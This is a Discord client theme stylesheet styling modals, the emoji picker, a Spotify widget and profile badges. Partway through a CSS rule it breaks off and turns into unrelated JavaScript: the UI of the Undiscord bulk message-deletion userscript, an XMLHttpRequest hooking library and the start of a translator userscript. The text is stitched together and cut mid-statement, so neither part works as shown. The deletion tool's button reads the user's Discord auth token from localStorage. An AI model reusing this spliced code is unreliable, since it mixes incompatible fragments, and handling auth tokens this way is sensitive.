/* ||| Modals | Emoji Picker |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Background */

.inspector-S2gM3e {
    background-color: var(--Color005);
}

.contentWrapper-SvZHNd {
    background: var(--Color005);
    border-radius: 24px;
    padding-bottom: 40px;
    height: 111%;
    box-shadow: none;
}

.positionContainer-DEuh7X {
    height: 444px;
    z-index: 2;
}

.theme-dark .wrapper-1-Fsb8 {
    background: var(--Color005);
    border-radius: 24px;
}

/* Search */

.container-2XeR5Z {
    background-color: var(--Color004);
    border-radius: 90px;
}

.input-3Xdcic {
    background-color: var(--Color004);
    border-radius: 90px;
}

/* Header */

.inspector-sdLnLS {
    background: var(--Color003);
    border-radius: 24px;
}

/* Button */

.navButtonActive-1MkytQ {
    background-color: var(--Color001);
    color: #fff;
}

/* Icon */

.categoryItemDefaultCategorySelected-_HCKoz, .categoryItemDefaultCategorySelected-_HCKoz:hover {
    background-color: var(--Color003);
    border-radius: 90px;

}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Autocomplete |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Background */

.theme-dark .autocomplete-1vrmpx {
    background: var(--Color005);
    bottom: calc(100% - 8px);
    border-radius: 24px;
    box-shadow: none;
    padding-bottom: 48px;
    margin-bottom: -42px;
    z-index: 1;
}

/* Header */

:root .contentTitle-2tG_sM {
    color: var(--Color006);
}

/* Selector */

.theme-dark .selected-1Tbx07 {
    background: var(--Color003);
    border-radius: 90px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Create Channel |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.theme-dark .modal-yWgWj- {
    background-color: var(--Color003);
    box-shadow: none;
    border-radius: 24px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Reaction Emoji Menu ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Background */

    .emojiPicker-3PwZFl {
        background-color: var(--Color005);
        border-radius: 24px;
        box-shadow: none;
        border: none;
    }

/* Inspector */

.inspector-sdLnLS {
    background: var(--Color005);
    border-radius: 24px;
}

/* Emoji */

.unicodeShortcut-15J8Ck {
    color: var(--Color008);
    height: 56px;

}

.emojiItem-14v6tW.emojiItemSelected-1aLkfV {
    background: var(--Color002);
    border-radius: 90px;
}

.guildIcon-3h-1IH {
    background: var(--Color002);
    border-radius: 90px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Upload  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark .uploadModal-2ifh8j {
    background: var(--Color003);
    border-radius: 24px;
    box-shadow: none;
}

.theme-dark .footer-3mqk7D {
    background: var(--Color005);
    border-radius: 0 0 24px 24px;
    box-shadow: none;
}


.uploadModal-2ifh8j .inner-3nWsbo .file-34mY5K .icon-kyxXVr.image-2yrs5j {
    margin-top: -33px;
    margin-left: 16px;
    margin-right: 16px;
    width: 104px;
    height: 104px;
    background-color: #fff;
        -webkit-box-sizing: border-box;
    box-sizing: border-box;
    border-radius: 90px;
    background-size: contain;
    -webkit-box-shadow: 0 2px 8px rgba(0,0,0,.4);
    box-shadow: 0 2px 8px rgba(0,0,0,.4);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Delete Message ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark .message-2qRu38 {
    background-color: var(--Color004);
    border: none;
    box-shadow: none;
    border-radius: 24px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Create a Server  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.theme-light .root-1gCeng {
    background: var(--Color003);
    box-shadow: none;
}

.theme-light .footer-2gL1pp {
    background: var(--Color005);
    box-shadow: none;
}

.lookFilled-1Gx00P.colorGrey-2DXtkV {
    color: var(--Color006);
    background: var(--Color001);
}

/* Button */

.lookFilled-1Gx00P.colorGrey-2DXtkV:hover {
    color: var(--Color006);
    background: var(--Color001);
    filter: brightness(120%);
                       }

                       /* Template */

                       .itemContainer-1LSFks {
                       border-radius: 24px;
                       border: none;
                       background: var(--Color004);
    margin-bottom: 12px;
}

.templatesList-2E6rTe {
    margin-top: 24px;
    padding: 0px 12px 12px 12px;
    height: 330px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Set a custom status  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Select Server Region  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.theme-dark .regionSelectModal-12e-57 {
    background: var(--Color004) !important;
}

/* Header Text */

.regionSelectModal-12e-57 .regionSelectModalHeader-21khC1 {
    color: var(--Color007);
    margin-bottom: 20px;
}

/* Buttons */

.theme-dark .regionSelectModalOption-2DSIZ3 {
    background: var(--Color003);
    border: none;
    border-radius: 90px;
}

.theme-dark .regionSelectModalOption-2DSIZ3:hover {
    background: var(--Color002);
    border: none;
}


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Add Game Popout  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.addGamePopout-2RY8Ju .actions-3wcPyD {
    -webkit-box-pack: end;
    -ms-flex-pack: end;
    justify-content: flex-end;
    margin-top: 12px;
}

.theme-dark .addGamePopout-2RY8Ju {
    background: var(--Color003);
    border-radius: 24px;
    border: none;
    box-shadow: var(--shadow001);

}




/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Region  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*  Background*/

.regionSelectPopout-p9-0_W {
    direction: ltr;
    box-shadow: var(--shadow001);
}

.theme-dark .quickSelectPopout-X1hvgV {
    background: var(--Color004);
    border-radius: 12px;
    position: relative;
    left: -4px;
}

.quickSelectPopoutOption-opKBx9 {
    padding-left: 40px;
    padding-right: 0px;
}

/*  flag */

.regionSelectFlag-1htPow {
    background-color: var(--Color001);
    border-radius: var(--Radius001);
}

/*  Region Text */

.regionSelectName-c5qL8O {
    direction: rtl;
    text-align: left;
    height: 20px;
    font-size: 14px;
    line-height: 20px;
    margin-right: -20px;
}

/*  Check */

.check-2by_h9 {
    position: relative;
    width: 16px;
    height: 12px;
    left: -136px;
}


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Add Server   ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.circleIconButton-jET_ig.selected-ugP_am {
    color: var(--Color006);
    background-color: var(--Color001);
    border-radius: var(--Radius002);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Search Menu   |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark .option-96V44q:after {
    background: none;
}

.theme-dark .option-96V44q.selected-rZcOL- {
    background-color: var(--Color001);
    border-radius: var(--Radius002);
}

    .theme-dark .container-3ayLPN {
        background: var(--Color004);
        border-radius: var(--Radius001);
        box-shadow: var(--shadow001);
    }

.theme-dark .option-96V44q.selected-rZcOL-:after {
    background: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | View Server as Role |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.notice-1tZwqv {
    background: var(--Color001);
    color: var(--Color006);
    height: 40px;
    margin: 12px 12px 0px 12px;
    border-radius: var(--Radius002);
}

/* Disable Button */

.button-3Ijpww:hover {
    background-color: var(--Color001);
    filter: brightness(110%) ;
                       }

                       /* Menu */

                       .container-3LUQwT {

                       background: var(--Color005);
    border-radius: var(--Radius001);

    max-width: 200px;
    -webkit-box-shadow: var(--shadow001);
    box-shadow: var(--shadow001);
}

/* Checkbox */

.iconContainer-1zobSR {
    border: 1.6px solid var(--Color007);
    border-radius: var(--Radius002);

}

.iconContainer-1zobSR.checked-1Fij_T {
    background: var(--Color001);
    border-color: var(--Color001);
}

.role-3ulsK-:hover {
    background-color: var(--Color001);
    border-radius: var(--Radius002);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Powercord | Spotify Modal ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.powercord-spotify {
    position: fixed;
    z-index: 2;
    bottom: 24px;
    right: 12px;
    width: 236px;
}

/* Advanced Controls */

.spotify-extra-controls {
    background: var(--Color005);
    border-radius: 24px;
    position: fixed;
    padding-top: 12px;
    padding-bottom: 50px;
    margin-bottom: 20px;
    bottom: 20px;
    width: 236px;
}

/* Buttons */

.powercord-spotify > .container-3baos1:hover button.button-14-BFJ{
    display: block;
}

.powercord-spotify > .container-3baos1 button[aria-checked="false"],
    .powercord-spotify > .container-3baos1 button:not([role="switch"]) {
        display: none;
    }

/* Seek Bar Progress */

.powercord-spotify .spotify-extra-controls + .spotify-seek {
    position: fixed;
    z-index: 9;
    right: 30px;
    width: 170px;
    bottom: 70px;
}

.powercord-spotify .spotify-seek {
    position: fixed;
    z-index: 9;
    right: 30px;
    width: 170px;
    bottom: 70px;
}


.powercord-spotify .spotify-seek:hover {
    background: var(--Color005);
    position: fixed;
    z-index: 9;
    right: 30px;
    width: 170px;
    bottom: 70px;
}

/* Buttons */

.powercord-spotify > .spotify-seek:hover button.spotify-seek-bar-progress{
    display: block;
}

.powercord-spotify > .spotify-seek button[aria-checked="false"],
    .powercord-spotify > .spotify-seek button:not([role="switch"]) {
        display: none;
    }

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Add-Ons | White Profile Badges |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.header-QKLPzZ .powercord-badge-cutie img:first-child{display: none !important}
.header-QKLPzZ .powercord-badge-cutie img:last-child{display:block!important}
[class^="profileBadge-2BqF-Z powercord-badge-"]{color:white!important}
[class*="BadgeStaff"]{filter: brightness(10)!important}
[class*="BadgePartner"]{filter: brightness(10)!import
        #undicord-btn{position: relative; height: 24px;width: auto;-webkit-box-flex: 0;-ms-flex: 0 0 auto;flex: 0 0 auto;margin: 0 8px;cursor:pointer; color: var(--interactive-normal);}
        #undiscord{position:fixed;top:100px;right:10px;bottom:10px;width:780px;z-index:99;color:var(--text-normal);background-color:var(--background-secondary);box-shadow:var(--elevation-stroke),var(--elevation-high);border-radius:4px;display:flex;flex-direction:column}
        #undiscord a{color:#00b0f4}
        #undiscord.redact .priv{display:none!important}
        #undiscord:not(.redact) .mask{display:none!important}
        #undiscord.redact [priv]{-webkit-text-security:disc!important}
        #undiscord .toolbar span{margin-right:8px}
        #undiscord button,#undiscord .btn{color:#fff;background:#7289da;border:0;border-radius:4px;font-size:14px}
        #undiscord button:disabled{display:none}
        #undiscord input[type="text"],#undiscord input[type="search"],#undiscord input[type="password"],#undiscord input[type="datetime-local"],#undiscord input[type="number"]{background-color:#202225;color:#b9bbbe;border-radius:4px;border:0;padding:0 .5em;height:24px;width:144px;margin:2px}
        #undiscord input#file{display:none}
        #undiscord hr{border-color:rgba(255,255,255,0.1)}
        #undiscord .header{padding:12px 16px;background-color:var(--background-tertiary);color:var(--text-muted)}
        #undiscord .form{padding:8px;background:var(--background-secondary);box-shadow:0 1px 0 rgba(0,0,0,.2),0 1.5px 0 rgba(0,0,0,.05),0 2px 0 rgba(0,0,0,.05)}
        #undiscord .logarea{overflow:auto;font-size:.75rem;font-family:Consolas,Liberation Mono,Menlo,Courier,monospace;flex-grow:1;padding:10px}
    `);

            popover = createElm(`
    <div id="undiscord" style="display:none;">
        <div class="header">
            Undiscord - Bulk delete messages
        </div>
        <div class="form">
            <div style="display:flex;flex-wrap:wrap;">
                <span>Authorization <a
                        href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/authToken.md" title="Help"
                        target="_blank">?</a> <button id="getToken">get</button><br>
                    <input type="password" id="authToken" placeholder="Auth Token" autofocus>*<br>
                    <span>Author <a href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/authorId.md"
                            title="Help" target="_blank">?</a> <button id="getAuthor">get</button></span>
                    <br><input id="authorId" type="text" placeholder="Author ID" priv></span>
                <span>Guild/Channel <a
                        href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/channelId.md" title="Help"
                        target="_blank">?</a>
                    <button id="getGuildAndChannel">get</button><br>
                    <input id="guildId" type="text" placeholder="Guild ID" priv><br>
                    <input id="channelId" type="text" placeholder="Channel ID" priv><br>
                    <label><input id="includeNsfw" type="checkbox">NSFW Channel</label><br><br>
                    <label for="file" title="Import list of channels from messages/index.json file"> Import: <span
                            class="btn">...</span> <input id="file" type="file" accept="application/json,.json"></label>
                </span><br>
                <span>Range <a href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/messageId.md"
                        title="Help" target="_blank">?</a><br>
                    <input id="minDate" type="datetime-local" title="After" style="width:auto;"><br>
                    <input id="maxDate" type="datetime-local" title="Before" style="width:auto;"><br>
                    <input id="minId" type="text" placeholder="After message with Id" priv><br>
                    <input id="maxId" type="text" placeholder="Before message with Id" priv><br>
                </span>
                <span>Search messages <a
                        href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/filters.md" title="Help"
                        target="_blank">?</a><br>
                    <input id="content" type="text" placeholder="Containing text" priv><br>
                    <label><input id="hasLink" type="checkbox">has: link</label><br>
                    <label><input id="hasFile" type="checkbox">has: file</label><br>
                    <label><input id="includePinned" type="checkbox">Include pinned</label>
                </span><br>
                <span>Search Delay <a
                href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/delay.md" title="Help"
                target="_blank">?</a><br>
                    <input id="searchDelay" type="number" value="100" step="100"><br>
                </span>
                <span>Delete Delay <a
                href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/delay.md" title="Help"
                target="_blank">?</a><br>
                    <input id="deleteDelay" type="number" value="1000" step="100">
                </span>
            </div>
            <hr>
            <button id="start" style="background:#43b581;width:80px;">Start</button>
            <button id="stop" style="background:#f04747;width:80px;" disabled>Stop</button>
            <button id="clear" style="width:80px;">Clear log</button>
            <label><input id="autoScroll" type="checkbox" checked>Auto scroll</label>
            <label title="Hide sensitive information for taking screenshots"><input id="redact" type="checkbox">Screenshot
                mode</label>
            <progress id="progress" style="display:none;"></progress> <span class="percent"></span>
        </div>
        <pre class="logarea">
            <center>Star this project on <a href="https://github.com/victornpb/deleteDiscordMessages" target="_blank">github.com/victornpb/deleteDiscordMessages</a>!\n\n
                <a href="https://github.com/victornpb/deleteDiscordMessages/issues" target="_blank">Issues or help</a>
            </center>
        </pre>
    </div>
    `);

            document.body.appendChild(popover);

            btn = createElm(`<div id="undicord-btn" tabindex="0" role="button" aria-label="Delete Messages" title="Delete Messages">
    <svg aria-hidden="false" width="24" height="24" viewBox="0 0 24 24">
        <path fill="currentColor" d="M15 3.999V2H9V3.999H3V5.999H21V3.999H15Z"></path>
        <path fill="currentColor" d="M5 6.99902V18.999C5 20.101 5.897 20.999 7 20.999H17C18.103 20.999 19 20.101 19 18.999V6.99902H5ZM11 17H9V11H11V17ZM15 17H13V11H15V17Z"></path>
    </svg>
    <br><progress style="display:none; width:24px;"></progress>
</div>`);

            btn.onclick = function togglePopover() {
                if (popover.style.display !== 'none') {
                    popover.style.display = 'none';
                    btn.style.color = 'var(--interactive-normal)';
                }
                else {
                    popover.style.display = '';
                    btn.style.color = '#f04747';
                }
            };

            function mountBtn() {
                const toolbar = document.querySelector('[class^=toolbar]');
                if (toolbar) toolbar.appendChild(btn);
            }

            const observer = new MutationObserver(function (_mutationsList, _observer) {
                if (!document.body.contains(btn)) mountBtn(); // re-mount the button to the toolbar
            });
            observer.observe(document.body, { attributes: false, childList: true, subtree: true });

            mountBtn();

            const $ = s => popover.querySelector(s);
            const logArea = $('pre');
            const startBtn = $('button#start');
            const stopBtn = $('button#stop');
            const autoScroll = $('#autoScroll');

            startBtn.onclick = async e => {
                const authToken = $('input#authToken').value.trim();
                const authorId = $('input#authorId').value.trim();
                const guildId = $('input#guildId').value.trim();
                const channelIds = $('input#channelId').value.trim().split(/\s*,\s*/);
                const minId = $('input#minId').value.trim();
                const maxId = $('input#maxId').value.trim();
                const minDate = $('input#minDate').value.trim();
                const maxDate = $('input#maxDate').value.trim();
                const content = $('input#content').value.trim();
                const hasLink = $('input#hasLink').checked;
                const hasFile = $('input#hasFile').checked;
                const includeNsfw = $('input#includeNsfw').checked;
                const includePinned = $('input#includePinned').checked;
                const searchDelay = parseInt($('input#searchDelay').value.trim());
                const deleteDelay = parseInt($('input#deleteDelay').value.trim());
                const progress = $('#progress');
                const progress2 = btn.querySelector('progress');
                const percent = $('.percent');

                const fileSelection = $("input#file");
                fileSelection.addEventListener("change", () => {
                    const files = fileSelection.files;
                    const channelIdField = $('input#channelId');
                    if (files.length > 0) {
                        const file = files[0];
                        file.text().then(text => {
                            let json = JSON.parse(text);
                            let channels = Object.keys(json);
                            channelIdField.value = channels.join(",");
                        });
                    }
                }, false);

                const stopHndl = () => !(stop === true);

                const onProg = (value, max) => {
                    if (value && max && value > max) max = value;
                    progress.setAttribute('max', max);
                    progress.value = value;
                    progress.style.display = max ? '' : 'none';
                    progress2.setAttribute('max', max);
                    progress2.value = value;
                    progress2.style.display = max ? '' : 'none';
                    percent.innerHTML = value && max ? Math.round(value / max * 100) + '%' : '';
                };


                stop = stopBtn.disabled = !(startBtn.disabled = true);
                for (let i = 0; i < channelIds.length; i++) {
                    await deleteMessages(authToken, authorId, guildId, channelIds[i], minId || minDate, maxId || maxDate, content, hasLink, hasFile, includeNsfw, includePinned, searchDelay, deleteDelay, logger, stopHndl, onProg);
                    stop = stopBtn.disabled = !(startBtn.disabled = false);
                }
            };
            stopBtn.onclick = e => stop = stopBtn.disabled = !(startBtn.disabled = false);
            $('button#clear').onclick = e => { logArea.innerHTML = ''; };
            $('button#getToken').onclick = e => {
                window.dispatchEvent(new Event('beforeunload'));
                const ls = document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage;
                $('input#authToken').value = JSON.parse(localStorage.token);
            };
            $('button#getAuthor').onclick = e => {
                $('input#authorId').value = JSON.parse(localStorage.user_id_cache);
            };
            $('button#getGuildAndChannel').onclick = e => {
                const m = location.href.match(/channels\/([\w@]+)\/(\d+)/);
                $('input#guildId').value = m[1];
                $('input#channelId').value = m[2];
            };
            $('#redact').onchange = e => {
                popover.classList.toggle('redact') &&
                    window.alert('This will attempt to hide personal information, but make sure to double check before sharing screenshots.');
            };

            const logger = (type = '', args) => {
                const style = { '': '', info: 'color:#00b0f4;', verb: 'color:#72767d;', warn: 'color:#faa61a;', error: 'color:#f04747;', success: 'color:#43b581;' }[type];
                logArea.insertAdjacentHTML('beforeend', `<div style="${style}">${Array.from(args).map(o => typeof o === 'object' ? JSON.stringify(o, o instanceof Error && Object.getOwnPropertyNames(o)) : o).join('\t')}</div>`);
                if (autoScroll.checked) logArea.querySelector('div:last-child').scrollIntoView(false);
            };

            // fixLocalStorage
            window.localStorage = document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage;

        }

        initUI();

        var hookAjax = '!function(t){function r(n){if(e[n])return e[n].exports;var o=e[n]={exports:{},id:n,loaded:!1};return t[n].call(o.exports,o,o.exports,r),o.loaded=!0,o.exports}var e={};return r.m=t,r.c=e,r.p="",r(0)}([function(t,r,e){e(1)(window)},function(t,r){t.exports=function(t){t.hookAjax=function(t){function r(r){return function(){var e=this.hasOwnProperty(r+"_")?this[r+"_"]:this.xhr[r],n=(t[r]||{}).getter;return n&&n(e,this)||e}}function e(r){return function(e){var n=this.xhr,o=this,i=t[r];if("function"==typeof i)n[r]=function(){t[r](o)||e.apply(n,arguments)};else{var a=(i||{}).setter;e=a&&a(e,o)||e;try{n[r]=e}catch(t){this[r+"_"]=e}}}}function n(r){return function(){var e=[].slice.call(arguments);if(!t[r]||!t[r].call(this,e,this.xhr))return this.xhr[r].apply(this.xhr,e)}}window._ahrealxhr=window._ahrealxhr||XMLHttpRequest,XMLHttpRequest=function(){var t=new window._ahrealxhr;Object.defineProperty(this,"xhr",{value:t})};var o=window._ahrealxhr.prototype;for(var i in o){var a="";try{a=typeof o[i]}catch(t){}"function"===a?XMLHttpRequest.prototype[i]=n(i):Object.defineProperty(XMLHttpRequest.prototype,i,{get:r(i),set:e(i),enumerable:!0})}return window._ahrealxhr},t.unHookAjax=function(){window._ahrealxhr&&(XMLHttpRequest=window._ahrealxhr),window._ahrealxhr=void 0},t.default=t}}]);';
        var langCodes = ["ja-JP(日本語)", "zh-CHS(简中)", "en-US(English)", "自动检测/AutoDetect", "Spanish(Español)", "zh-CHT(繁中)", 'portuguese(Português)'];
        var GMDiscordTrsOpt = {};
        GMDiscordTrsOpt.GMDiscordTrsOn = GM_getValue(['GMDiscordTrsOn']) === true ? true: false;
        GMDiscordTrsOpt.GMDiscordTrssplitStrDef = GM_getValue('GMDiscordTrssplitStrDef') ? GM_getValue('GMDiscordTrssplitStrDef') : "\r\n";
        GMDiscordTrsOpt.GMDiscordTrsOnlyDist = GM_getValue(['GMDiscordTrsOnlyDist']) === true ? true: false;
        GMDiscordTrsOpt.GMDiscordTrsApiKey = GM_getValue('GMDiscordTrsApiKey') ? GM_getValue('GMDiscordTrsApiKey') : "";
        GMDiscordTrsOpt.GMDiscordTrsAppId = GM_getValue('GMDiscordTrsAppId') ? GM_getValue('GMDiscordTrsAppId') : "";
        GMDiscordTrsOpt.GMDiscordTrsFromLang = !GM_getValue('GMDiscordTrsFromLang') ? 0 : GM_getValue('GMDiscordTrsFromLang');
        GMDiscordTrsOpt.GMDiscordTrsToLang = !GM_getValue('GMDiscordTrsToLang') ? 0 : GM_getValue('GMDiscordTrsToLang');
        GMDiscordTrsOpt.GMDiscordTrsShowEngine = !GM_getValue('GMDiscordTrsShowEngine') ? false : GM_getValue('GMDiscordTrsShowEngine');
        var engineFuncs = {
            Google: function(text, callback) {
                var langPars = ['ja', 'zh-CN', 'en', 'auto', 'es', 'zh-CN', 'pt'];
                GM_xmlhttpRequest({
                    method: 'GET',
                    url: "https://translate.google.com/translate_a/single?client=at&sl=" + langPars[GMDiscordTrsOpt.GMDiscordTrsFromLang] + "&tl=" + langPars[GMDiscordTrsOpt.GMDiscordTrsToLang] + "&dt=t&q=" + encodeURIComponent(text),
                    onload: function(responseDetails) {
                        //console.warn(responseDetails);
                        try {
                            var result = JSON.parse(responseDetails.response);
                            var tt = "";
                            result[0].forEach(function(a) {
                                tt += a[0]
                            });
                            callback(tt);
                        } catch(e) {
                            callback("");
                            console.error(e);
                        }
                    },
                    "headers": {
                        "User-Agent": "memoQ",
                        "Accept": "*/*",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
                    },
                    onerror: function(error) {
                        console.error(error);
                    }
                });
            },
            Caiyun: function(text, callback) {
                var langPars = ['ja', 'zh', 'en', 'auto', 'es', 'zh', 'pt'];
                GM_xmlhttpRequest({
                    method: 'POST',
                    url: "http://api.interpreter.caiyunai.com/v1/translator",
                    data: JSON.stringify({
                        "source": text,
                        "trans_type": langPars[GMDiscordTrsOpt.GMDiscordTrsFromLang] + "2" + langPars[GMDiscordTrsOpt.GMDiscordTrsToLang],
